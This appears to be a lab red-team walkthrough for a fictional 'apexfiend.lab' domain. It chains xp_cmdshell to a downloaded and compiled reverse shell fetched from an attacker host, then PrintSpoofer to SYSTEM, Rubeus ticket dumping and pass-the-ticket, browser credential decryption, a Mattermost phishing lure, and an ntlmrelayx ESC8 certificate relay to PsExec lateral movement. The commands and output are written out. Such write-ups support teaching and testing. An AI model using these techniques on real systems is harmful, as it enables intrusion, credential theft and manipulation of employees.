# Apexfiend — PKI Path (MSSQL03 → j.derek → m.ortega → WK04)

## 1. Purpose

This document continues from `sql-path.md`: OS-level command execution on `MSSQL03` as `corp\svc_mssql02`. It narrates the confirmed, tested chain from there through `j.derek`, the ESC8 certificate relay against `CA02`, and on to `m.ortega`/`WK04` — executing in practice the PKI analysis already documented across `06-pki/`.

## 2. From xp_cmdshell to an Interactive Foothold

The `xp_cmdshell` access obtained in `sql-path.md` is used to stage and compile a custom reverse-shell payload directly on `MSSQL03`, using the .NET Framework's own C# compiler — a living-off-the-land technique requiring no additional tooling to be transferred as a flagged executable:

```sql
... EXEC xp_cmdshell ''''powershell iwr -uri http://<attacker>/revshell.cs -outfile C:\temp\revshell.cs'''' --'';
... EXEC xp_cmdshell ''''C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /target:winexe ... /out:C:\temp\svchost.exe C:\temp\revshell.cs'''' --'';
... EXEC xp_cmdshell ''''C:\temp\svchost.exe'''' --'';
```

The resulting connection confirms the service identity already established in `sql-path.md`: `corp\svc_mssql02`. **PrintSpoofer is then used to escalate from the service account to `SYSTEM`** on `MSSQL03` — the standard technique for abusing `SeImpersonatePrivilege`, which service accounts commonly (and, here, actually do) hold.

## 3. Confirming the Certificate Maintenance Task

With `SYSTEM`-level access, `j.derek`'s own profile is readable. His Desktop contains exactly the files already documented at a design level in `06-pki/certificate-inventory.md`: `CertificateMaintenance.ps1`, `Certificatemssql03.exe`, and a supporting SQL client DLL — confirming that document's analysis without needing any correction.

## 4. Recovering j.derek's Ticket (No Password Needed)

Because `j.derek`'s scheduled task logs on interactively (`certificate-inventory.md`, Section 2), his Kerberos tickets are present in `SYSTEM`'s view of LSASS on this host. Rubeus is used, via the same AMSI-bypass loader pattern used earlier in this project, to triage all cached tickets:

```text
Invoke-Rubeus 'triage'
```

This surfaces `j.derek`'s own `krbtgt` ticket (alongside tickets for `Administrator`, `mssql03$`, and `svc_mssql02` — all present on this box from prior activity). His specific ticket is extracted directly, without ever touching a password or NT hash:

```text
Invoke-Rubeus 'dump /luid:<j.derek LUID> /service:krbtgt /nowrap'
```

The resulting base64 ticket is carried back to `WK01` (the operator's existing foothold), written to disk as a `.kirbi` file, and imported into the current session with Rubeus `ptt` (pass-the-ticket) — `klist` confirms `j.derek`'s ticket is now active in that session. `\\wk03\c$` becomes reachable, revealing a `PKI-Operations` share — matching `certificate-inventory.md`'s documented destination share exactly. **`PsExec64.exe` is then used to obtain command execution on `WK03` as `corp\j.derek`** (`172.16.60.106`, matching `02-active-directory/organizational-units.md`'s already-confirmed DNS record).

## 5. j.derek's Credentials and OSINT

Firefox, installed on `WK03`, is decrypted the same way as on `DEV-LAPTOP` (`web-to-vpn.md`, Section 3), recovering `j.derek`'s saved credentials for Gitea, Mattermost, and his mailbox.

### Gitea — PKI Documentation

Logging into `gitea.apexfiend.lab` as `j.derek` surfaces `PKI-Repository/pki-documentation` — the same repository already fully drafted elsewhere in this project. `CA02`'s hostname and address are confirmed reachable (`ping` succeeds from `WK03`), and `templates/legacy-and-test-templates.md` singles out `UserTemporary` as a direct copy of the default `User` template — independently arriving at the same template already identified as the attack-relevant one in `06-pki/certificate-templates.md`.

### Mattermost — Confirming the Social Picture

Reading `#people-ops`, `#it-infrastructure`, and the private `#pki-operations` channel (whose participants are exactly `j.derek`, `m.ortega`, and `m.alvarez`) establishes the organizational picture already designed at a narrative level: `CA02` is reachable only from select systems; `WK03` is the PKI operations workstation; a documented `WK03 → inventory → MSSQL03` dependency (already confirmed firsthand by this point in the chain); `WK04` and select automation systems have approved connectivity to `CA02`; `m.ortega` is tied to Platform Operations and PKI-adjacent automation; `j.derek` audits, `m.alvarez` administers.

### Outlook — The Social Engineering Pretext

`j.derek`'s mailbox shows frequent correspondence with `m.ortega` about certificate administration. One exchange notes that `CA02`'s enrollment service uses **plain HTTP**, by direction from management, for convenience — and separately reveals that `m.ortega` has edit/enroll access to the `UserTemporary` test template specifically. Combining the HTTP enrollment endpoint with `m.ortega`'s confirmed Enroll right is what identifies **ESC8** as the viable technique — matching `06-pki/certificate-templates.md`, Section 4 exactly.

## 6. The ESC8 Relay

A Mattermost message is crafted to `m.ortega`, enticing him to access a UNC path that does not actually exist — the operator's own relay listener, reachable at `WK03`'s own address:

```text
\\172.16.60.106\very-important
```

When `m.ortega` accesses it, his machine's SMB authentication attempt is relayed to `CA02`'s HTTP enrollment endpoint, requesting a certificate under the `UserTemporary` template:

```text
impacket-ntlmrelayx -t http://172.16.50.103/certsrv/certfnsh.asp -smb2support --adcs --template userTemporary
```

```text
[*] (SMB): Authenticating connection from CORP/M.ORTEGA@172.16.60.107 against http://172.16.50.103 SUCCEED
[*] http://CORP/M.ORTEGA@172.16.50.103 [1] -> GOT CERTIFICATE! ID 39
[*] Certificate successfully written to file → M.ORTEGA.pfx
```

The relay succeeds on the first authentication attempt; subsequent connections from the same victim are skipped (the tool recognizes the attack has already landed).

## 7. From Certificate to Domain Access

```text
certipy-ad auth -pfx M.ORTEGA.pfx -dc-ip 172.16.20.100
→ SAN UPN: m.ortega@corp.apexfiend.lab
→ NT hash recovered via PKINIT
```

The recovered RC4/NT hash is used directly with Rubeus, exactly as in the Daniel/WK02 step of `helpdesk-escalation.md`:

```text
Invoke-Rubeus 'asktgt /user:m.ortega /domain:corp.apexfiend.lab /rc4:<hash> /ptt'
```

With `m.ortega`'s ticket injected into the `WK01` session, `\\wk04\c$` becomes reachable, and `PsExec64.exe` provides command execution:

```text
hostname:  WK04
whoami:    corp\m.ortega
IP:        172.16.60.107
```

This completes the PKI path: from database-host code execution, through a certificate auditor's own recurring task, to a forged domain certificate obtained purely through social engineering plus a known, named AD CS relay technique — no password for either `j.derek` or `m.ortega` was ever recovered or needed.

## 8. Chain Summary

```text
MSSQL03 — corp\svc_mssql02 (from sql-path.md)
      │  compiled reverse shell → PrintSpoofer
      ▼
MSSQL03 — SYSTEM
      │  Rubeus triage → j.derek's own interactive TGT
      ▼
WK01 session — pass-the-ticket as j.derek
      │  PsExec to WK03
      ▼
WK03 — corp\j.derek
      │  Firefox creds → Gitea (pki-documentation) + Mattermost (#pki-operations) + Outlook
      │  identifies UserTemporary + HTTP enrollment + m.ortega's Enroll right → ESC8 viable
      ▼
Mattermost social engineering → m.ortega accesses a controlled UNC path
      │  ntlmrelayx → CA02 HTTP enrollment (certfnsh.asp, UserTemporary)
      ▼
M.ORTEGA.pfx → NT hash via Certipy
      │  Rubeus asktgt /ptt
      ▼
WK04 — corp\m.ortega (PsExec)
```

## 9. Validation Status

| Item | Status |
|---|---|
| Compiled-payload execution via `xp_cmdshell` and `csc.exe` | Tested and confirmed |
| PrintSpoofer privilege escalation to `SYSTEM` on `MSSQL03` | Tested and confirmed |
| `j.derek`'s desktop artifacts matching `certificate-inventory.md` | Verified, no correction needed |
| Ticket triage and extraction of `j.derek`'s own TGT | Tested and confirmed |
| Pass-the-ticket to `WK03` as `j.derek` | Tested and confirmed |
| Gitea/Mattermost/Outlook OSINT confirming `UserTemporary` + ESC8 viability | Tested and confirmed |
| NTLM relay to `CA02`'s HTTP enrollment endpoint | Tested and confirmed |
| Certificate-to-hash recovery and pass-the-ticket as `m.ortega` | Tested and confirmed |
| Lateral movement to `WK04` as `m.ortega` | Tested and confirmed |

## 10. Related Documentation

- `sql-path.md` — Precedes this document; ends with OS-level access on `MSSQL03`
- `jenkins-path.md` *(pending)* — Continues from `m.ortega`/`WK04` into `JENKINS01`
- `../06-pki/ca02.md`, `certificate-templates.md`, `certificate-inventory.md`, `adcs-architecture.md` — The design-level analysis this document executes against
- `../../pki-documentation/` *(separate repository)* — Referenced directly as an in-lab artifact in this chain